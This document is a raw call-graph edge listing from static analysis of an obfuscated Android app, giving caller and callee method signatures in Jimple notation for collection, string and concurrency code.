SPECIAL edge: specialinvoke $r9.<mly: void <init>(java.lang.Object,java.lang.Object,java.lang.Object)>($r2, $r3, $r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <mly: void <init>(java.lang.Object,java.lang.Object,java.lang.Object)>
STATIC edge: $i6 = staticinvoke <izw: int ac(int)>($i6) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <izw: int ac(int)>
VIRTUAL edge: $r3 = virtualinvoke $r3.<java.lang.String: java.lang.String substring(int,int)>(0, $i0) in <ivw: ivw d(java.util.Locale)> ==> <java.lang.String: java.lang.String substring(int,int)>
STATIC edge: $z1 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: boolean b(j$.util.concurrent.l[],int,j$.util.concurrent.l)>($r3, $i2, $r6) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.ConcurrentHashMap: boolean b(j$.util.concurrent.l[],int,j$.util.concurrent.l)>
CLINIT edge: staticinvoke <mag: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <mag: void <clinit>()>
STATIC edge: $r2 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r2, $i5) in <lma: lma i(int,java.lang.Object[])> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
VIRTUAL edge: $r4 = virtualinvoke r0.<ljd: int[] w()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: int[] w()>
SPECIAL edge: specialinvoke $r9.<java.lang.StringBuilder: void <init>()>() in <iej: void g(java.lang.String,iec)> ==> <java.lang.StringBuilder: void <init>()>
INTERFACE edge: interfaceinvoke $r5.<java.util.Collection: boolean add(java.lang.Object)>($r2) in <lli: void e(java.lang.Object,java.lang.Object)> ==> <lkh: boolean add(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <lri: boolean j(java.util.Set,java.lang.Object)>(r0, $r1) in <lma: boolean equals(java.lang.Object)> ==> <lri: boolean j(java.util.Set,java.lang.Object)>
STATIC edge: $r2 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
STATIC edge: staticinvoke <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>($r5, 0, $r6, 6, $i1) in <lma: lma w(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object[])> ==> <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>
STATIC edge: $r3 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r3) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
STATIC edge: $i2 = staticinvoke <java.lang.Integer: int numberOfLeadingZeros(int)>($i2) in <j$.util.concurrent.ConcurrentHashMap: void q(int)> ==> <java.lang.Integer: int numberOfLeadingZeros(int)>
STATIC edge: $i6 = staticinvoke <java.lang.Math: int max(int,int)>(1, $i6) in <ljf: boolean add(java.lang.Object)> ==> <java.lang.Math: int max(int,int)>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("at index ") in <lri: void t(java.lang.Object,int)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke $r0.<java.lang.String: int length()>() in <ivw: boolean v(java.lang.String)> ==> <java.lang.String: int length()>
SPECIAL edge: specialinvoke r0.<lkg: void c(java.lang.Object)>($r1) in <lly: void j(java.lang.Object)> ==> <lkg: void c(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.util.AbstractSet: void <init>()>() in <ljf: void <init>()> ==> <java.util.AbstractSet: void <init>()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractSet: int hashCode()>
STATIC edge: $r1 = staticinvoke <izw: java.lang.Object al(int)>($i1) in <ljf: int b()> ==> <izw: java.lang.Object al(int)>
STATIC edge: $i1 = staticinvoke <java.lang.Integer: int highestOneBit(int)>($i0) in <izw: int ae(int)> ==> <java.lang.Integer: int highestOneBit(int)>
STATIC edge: $i0 = staticinvoke <izw: int ae(int)>($i0) in <izw: int ak(int)> ==> <izw: int ae(int)>
SPECIAL edge: specialinvoke $r0.<ldr: void <init>()>() in <ldr: void <clinit>()> ==> <ldr: void <init>()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractSet: int hashCode()>
STATIC edge: $i3 = staticinvoke <izw: int af(int,int)>($i2, $i0) in <ljd: int z(int,int,int,int)> ==> <izw: int af(int,int)>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.Object: int hashCode()>() in <izw: int ad(java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
STATIC edge: staticinvoke <lri: void v(java.lang.Object[],int)>($r0, $i0) in <lri: void u(java.lang.Object[])> ==> <lri: void v(java.lang.Object[],int)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(2) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
SPECIAL edge: specialinvoke $r14.<java.lang.StringBuilder: void <init>()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: $i1 = virtualinvoke r0.<lkq: int size()>() in <lkq: lsb C(int)> ==> <lql: int size()>
SPECIAL edge: specialinvoke $r1.<java.lang.StringBuilder: void <init>()>() in <izw: void as(int,java.lang.String)> ==> <java.lang.StringBuilder: void <init>()>
INTERFACE edge: $r8 = interfaceinvoke $r6.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean equals(java.lang.Object)> ==> <liz: java.lang.Object next()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Throwable: java.lang.Throwable getCause()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r6 = virtualinvoke r0.<ljd: java.lang.Object[] y()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: java.lang.Object[] y()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<lkq: int size()>() in <lqs: int size()> ==> <lql: int size()>
VIRTUAL edge: $i1 = virtualinvoke $r2.<java.lang.String: int length()>() in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.String: int length()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Class: java.lang.Class forName(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.String: int hashCode()>
VIRTUAL edge: $r2 = virtualinvoke r0.<lkh: java.lang.Object[] n()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lqr: java.lang.Object[] n()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("<") in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<java.lang.IndexOutOfBoundsException: void <init>(java.lang.String)>("cannot read from empty metadata") in <ltr: lsz c(int)> ==> <java.lang.IndexOutOfBoundsException: void <init>(java.lang.String)>
SPECIAL edge: $r1 = specialinvoke r0.<lkt: lkx b(boolean)>(1) in <lkt: lkx l()> ==> <lkt: lkx b(boolean)>
CLINIT edge: staticinvoke <ldr: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <ldr: void <clinit>()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <hfd: void <init>(axu,java.lang.Class,ldp)> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke $r7.<lqr: void <init>(java.lang.Object[],int,java.lang.Object[],int,int)>($r2, $i4, $r0, $i0, $i5) in <lma: lma i(int,java.lang.Object[])> ==> <lqr: void <init>(java.lang.Object[],int,java.lang.Object[],int,int)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <java.util.AbstractSet: int hashCode()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(45) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
SPECIAL edge: specialinvoke $r2.<java.lang.NullPointerException: void <init>(java.lang.String)>($r4) in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("GifThumbnail", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
SPECIAL edge: specialinvoke $r9.<j$.util.concurrent.r: void <init>(j$.util.concurrent.s)>($r7) in <j$.util.concurrent.ConcurrentHashMap: void p(j$.util.concurrent.l[],int)> ==> <j$.util.concurrent.r: void <init>(j$.util.concurrent.s)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Empty subtag, error index: ") in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke $r11.<lma: int size()>() in <lmb: lme f()> ==> <lrg: int size()>
STATIC edge: $z0 = staticinvoke <java.util.Arrays: boolean equals(int[],int[])>($r8, $r9) in <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)> ==> <java.util.Arrays: boolean equals(int[],int[])>
INTERFACE edge: $i0 = interfaceinvoke $r10.<java.util.Collection: int size()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lql: int size()>
INTERFACE edge: $r2 = interfaceinvoke $r1.<java.util.Iterator: java.lang.Object next()>() in <lri: int b(java.util.Set)> ==> <lsb: java.lang.Object next()>
VIRTUAL edge: $r6 = virtualinvoke r0.<lqs: lsa l()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lqs: lsa l()>
INTERFACE edge: $r3 = interfaceinvoke $r2.<java.util.Map$Entry: java.lang.Object getValue()>() in <lid: boolean equals(java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getValue()>
CLINIT edge: staticinvoke <gsr: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <gsr: void <clinit>()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lta: boolean equals(java.lang.Object)> ==> <lsp: boolean equals(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lma: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <lrg: int hashCode()>
SPECIAL edge: specialinvoke $r0.<java.lang.IndexOutOfBoundsException: void <init>(java.lang.String)>($r3) in <iye: void O(int,int)> ==> <java.lang.IndexOutOfBoundsException: void <init>(java.lang.String)>
STATIC edge: $i0 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: int k(int)>($i0) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.ConcurrentHashMap: int k(int)>
VIRTUAL edge: $z0 = virtualinvoke $r4.<nzh: boolean e()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: boolean e()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <java.lang.Enum: int hashCode()>
INTERFACE edge: $i0 = interfaceinvoke $r1.<java.util.Map: int size()>() in <ljd: int size()> ==> <java.util.HashMap: int size()>
STATIC edge: $i6 = staticinvoke <java.lang.Math: int min(int,int)>(1073741823, $i6) in <ljf: boolean add(java.lang.Object)> ==> <java.lang.Math: int min(int,int)>
STATIC edge: $z0 = staticinvoke <kzs: boolean d(java.lang.Object,java.lang.Object)>($r1, $r3) in <lid: boolean equals(java.lang.Object)> ==> <kzs: boolean d(java.lang.Object,java.lang.Object)>
STATIC edge: $r1 = staticinvoke <iye: java.lang.String X(int,int,java.lang.String)>($i1, $i0, "index") in <iye: void Q(int,int)> ==> <iye: java.lang.String X(int,int,java.lang.String)>
STATIC edge: $i8 = staticinvoke <izw: int aj(java.lang.Object,int)>($r1, $i3) in <ljd: int z(int,int,int,int)> ==> <izw: int aj(java.lang.Object,int)>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljd: java.util.Map o()>() in <ljd: java.lang.Object get(java.lang.Object)> ==> <ljd: java.util.Map o()>
VIRTUAL edge: $r2 = virtualinvoke $r1.<java.lang.StringBuilder: java.lang.String toString()>() in <izw: void as(int,java.lang.String)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lkq: int hashCode()>
VIRTUAL edge: $r3 = virtualinvoke $r2.<mly: java.lang.IllegalArgumentException f()>() in <lkt: lkx b(boolean)> ==> <mly: java.lang.IllegalArgumentException f()>
VIRTUAL edge: $c1 = virtualinvoke $r0.<java.lang.String: char charAt(int)>(2) in <ivw: boolean F(java.lang.String)> ==> <java.lang.String: char charAt(int)>
STATIC edge: $r0 = staticinvoke <j$.util.concurrent.r: j$.util.concurrent.s g(j$.util.concurrent.s,j$.util.concurrent.s)>($r0, $r2) in <j$.util.concurrent.r: j$.util.concurrent.s c(j$.util.concurrent.s,j$.util.concurrent.s)> ==> <j$.util.concurrent.r: j$.util.concurrent.s g(j$.util.concurrent.s,j$.util.concurrent.s)>
INTERFACE edge: $r2 = interfaceinvoke $r3.<java.util.Map: java.lang.Object put(java.lang.Object,java.lang.Object)>($r2, $r1) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <java.util.HashMap: java.lang.Object put(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r3.<java.lang.IllegalStateException: void <init>(java.lang.String)>($r4) in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.IllegalStateException: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r4.<nzh: void d()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: void d()>
VIRTUAL edge: $r14 = virtualinvoke $r7.<lts: lsz c(int)>($i1) in <lsd: boolean b(lsr)> ==> <lsm: lsz c(int)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <j$.util.concurrent.k: boolean equals(java.lang.Object)> ==> <lta: boolean equals(java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <lrg: int hashCode()>
STATIC edge: $z0 = staticinvoke <ivw: boolean O(char)>($c2) in <ivw: boolean s(java.lang.String)> ==> <ivw: boolean O(char)>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>($r4) in <mly: java.lang.IllegalArgumentException f()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
SPECIAL edge: specialinvoke $r6.<j$.util.concurrent.w: void <init>()>() in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <j$.util.concurrent.w: void <init>()>
VIRTUAL edge: $i6 = virtualinvoke $r3.<java.lang.Object: int hashCode()>() in <lma: lma i(int,java.lang.Object[])> ==> <lqr: int hashCode()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lma: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r4) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("TenorAutocompleteMetadata", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lsb: java.lang.Object next()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(45) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lrg: int hashCode()> ==> <lrg: int hashCode()>
VIRTUAL edge: $r1 = virtualinvoke r0.<lqs: lsa l()>() in <lqs: java.util.Iterator iterator()> ==> <lqs: lsa l()>
VIRTUAL edge: $i0 = virtualinvoke r0.<ljd: int e()>() in <ljd: java.util.Map m()> ==> <ljd: int e()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lkq: int hashCode()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lkq: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <nzh: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $r1 = virtualinvoke r0.<ljf: java.util.Set g()>() in <ljf: java.util.Iterator iterator()> ==> <ljf: java.util.Set g()>
SPECIAL edge: specialinvoke $r2.<nzh: void <init>()>() in <ivv: void <init>(byte[])> ==> <nzh: void <init>()>
STATIC edge: staticinvoke <ojg: void d(java.lang.Object,java.lang.String)>($r1, "destination") in <nvw: void j(int[],int[],int,int,int)> ==> <ojg: void d(java.lang.Object,java.lang.String)>
INTERFACE edge: $i0 = interfaceinvoke $r10.<java.util.Collection: int size()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lrg: int size()>
INTERFACE edge: $r4 = interfaceinvoke $r3.<java.util.Map: java.lang.Object get(java.lang.Object)>($r1) in <lli: void e(java.lang.Object,java.lang.Object)> ==> <ljd: java.lang.Object get(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.String: int length()>() in <ivv: void g(java.lang.String)> ==> <java.lang.String: int length()>
VIRTUAL edge: $r7 = virtualinvoke $r4.<nzh: java.lang.String c()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: java.lang.String c()>
STATIC edge: $r5 = staticinvoke <lqd: lqd b(java.util.Comparator)>($r4) in <lmb: lme f()> ==> <lqd: lqd b(java.util.Comparator)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lkq: int size()>() in <lkq: int hashCode()> ==> <lql: int size()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lkq: int hashCode()>
SPECIAL edge: specialinvoke $r25.<j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.l)>($i5, $r15, $r16, $r10) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.l)>
SPECIAL edge: $r3 = specialinvoke r0.<ljf: java.lang.Object[] s()>() in <ljf: void j(int,java.lang.Object,int,int)> ==> <ljf: java.lang.Object[] s()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <lqr: int hashCode()>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <lta: boolean equals(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lma: boolean equals(java.lang.Object)>
STATIC edge: $r6 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i4) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
STATIC edge: $i0 = staticinvoke <izw: int ag(int,int,int)>($i0, $i1, 31) in <ljf: void q(int)> ==> <izw: int ag(int,int,int)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.LinkageError: void <init>()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke r0.<lsn: void q(lsz,java.lang.Object)>($r3, $r24) in <lsd: boolean b(lsr)> ==> <lsn: void q(lsz,java.lang.Object)>
VIRTUAL edge: $r7 = virtualinvoke $r4.<nzh: java.lang.String c()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: java.lang.String c()>
INTERFACE edge: $r2 = interfaceinvoke $r9.<java.util.Map$Entry: java.lang.Object getValue()>() in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.k: java.lang.Object getValue()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <j$.sun.misc.b: void <init>(sun.misc.Unsafe)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lta: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)>
STATIC edge: staticinvoke <lvm: void h(boolean,java.lang.String)>($z0, "maxDepth must be > 0 or -1") in <lwk: java.lang.StackTraceElement[] b(java.lang.Class,int)> ==> <lvm: void h(boolean,java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke r0.<lma: boolean d()>() in <lma: boolean equals(java.lang.Object)> ==> <lma: boolean d()>
VIRTUAL edge: $r1 = virtualinvoke r0.<lkq: lsb B()>() in <lkq: java.util.Iterator iterator()> ==> <lkq: lsb B()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r9 = virtualinvoke $r8.<lme: lma d(java.lang.Object)>($r13) in <hbv: void j()> ==> <lme: lma d(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<lql: void <init>(java.lang.Object[],int)>($r1, $i0) in <lkq: lkq h(java.lang.Object[],int)> ==> <lql: void <init>(java.lang.Object[],int)>
INTERFACE edge: $r4 = interfaceinvoke $r3.<java.util.Map$Entry: java.lang.Object getValue()>() in <lvr: int a(java.util.Map$Entry,int,int,java.lang.Object[],int[])> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getValue()>
SPECIAL edge: specialinvoke $r1.<lnc: void <init>(java.lang.Object)>($r0) in <izw: lsa w(java.lang.Object)> ==> <lnc: void <init>(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <hfd: void <init>(hff,java.lang.Class,ldp)> ==> <java.lang.Object: void <init>()>
CLINIT edge: staticinvoke <iwt: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <iwt: void <clinit>()>
INTERFACE edge: $z0 = interfaceinvoke $r7.<java.util.Iterator: boolean hasNext()>() in <lmb: lme f()> ==> <lnc: boolean hasNext()>
VIRTUAL edge: virtualinvoke r0.<lkh: int b(java.lang.Object[],int)>($r1, 0) in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lrg: int b(java.lang.Object[],int)>
SPECIAL edge: specialinvoke r0.<lma: void <init>()>() in <lrg: void <init>(java.lang.Object)> ==> <lma: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
STATIC edge: $r2 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
SPECIAL edge: specialinvoke $r3.<j$.util.concurrent.s: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.s,j$.util.concurrent.s)>($i1, $r1, $r2, null, null) in <j$.util.concurrent.ConcurrentHashMap: void p(j$.util.concurrent.l[],int)> ==> <j$.util.concurrent.s: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.s,j$.util.concurrent.s)>
INTERFACE edge: $r5 = interfaceinvoke $r2.<java.util.List: java.util.Iterator iterator()>() in <lri: boolean V(java.util.List,java.lang.Object)> ==> <lkq: java.util.Iterator iterator()>
VIRTUAL edge: virtualinvoke r0.<nzh: void d()>() in <nzh: boolean f(ivv)> ==> <nzh: void d()>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Enum: void <init>(java.lang.String,int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $i1 = staticinvoke <izw: int ak(int)>($i0) in <ljd: int b()> ==> <izw: int ak(int)>
SPECIAL edge: $z1 = specialinvoke $r2.<ivw: boolean P()>() in <ivw: boolean equals(java.lang.Object)> ==> <ivw: boolean P()>
INTERFACE edge: $r2 = interfaceinvoke $r1.<java.util.Map: java.util.Set entrySet()>() in <lmb: lme f()> ==> <ljd: java.util.Set entrySet()>
STATIC edge: $z0 = staticinvoke <ivw: boolean t(char[],int,int)>($r3, $i0, $i1) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean t(char[],int,int)>
STATIC edge: $i6 = staticinvoke <izw: int ag(int,int,int)>($i7, $i8, $i4) in <ljf: int o(int,int,int,int)> ==> <izw: int ag(int,int,int)>
STATIC edge: $i2 = staticinvoke <j$.util.concurrent.ThreadLocalRandom: int b()>() in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.util.concurrent.ThreadLocalRandom: int b()>
STATIC edge: $i1 = staticinvoke <izw: int ak(int)>($i0) in <ljf: int b()> ==> <izw: int ak(int)>
INTERFACE edge: $z0 = interfaceinvoke $r6.<java.util.Iterator: boolean hasNext()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lsb: boolean hasNext()>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lnc: java.lang.Object next()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <java.lang.Enum: void <init>(java.lang.String,int)> ==> <java.lang.Object: void <init>()>
SPECIAL edge: $i4 = specialinvoke r0.<ljd: int z(int,int,int,int)>($i4, $i5, $i3, $i0) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: int z(int,int,int,int)>
STATIC edge: staticinvoke <java.lang.Double: boolean isNaN(double)>($d0) in <lma: int e(int)> ==> <java.lang.Double: boolean isNaN(double)>
VIRTUAL edge: $r9 = virtualinvoke $r7.<lme: lma c()>() in <hbv: void j()> ==> <lme: lma c()>
STATIC edge: $i0 = staticinvoke <izw: int ag(int,int,int)>($i0, $i1, 31) in <ljd: void A(int)> ==> <izw: int ag(int,int,int)>
SPECIAL edge: specialinvoke r0.<lli: void <init>()>() in <lmb: void <init>()> ==> <lli: void <init>()>
INTERFACE edge: $z0 = interfaceinvoke $r6.<java.util.Iterator: boolean hasNext()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lsb: boolean hasNext()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <java.util.AbstractSet: int hashCode()>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lsb: java.lang.Object next()>
INTERFACE edge: $i1 = interfaceinvoke $r4.<java.util.Set: int size()>() in <lqs: boolean equals(java.lang.Object)> ==> <ljf: int size()>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>($r1, $r2) in <lkt: void a(java.lang.Object,java.lang.Object)> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
VIRTUAL edge: virtualinvoke $r6.<gwk: void a(gwm)>(r0) in <hcb: void <init>()> ==> <gwk: void a(gwm)>
STATIC edge: staticinvoke <iye: void y(boolean,java.lang.Object)>(1, "Expected size must be >= 0") in <ljf: void i(int)> ==> <iye: void y(boolean,java.lang.Object)>
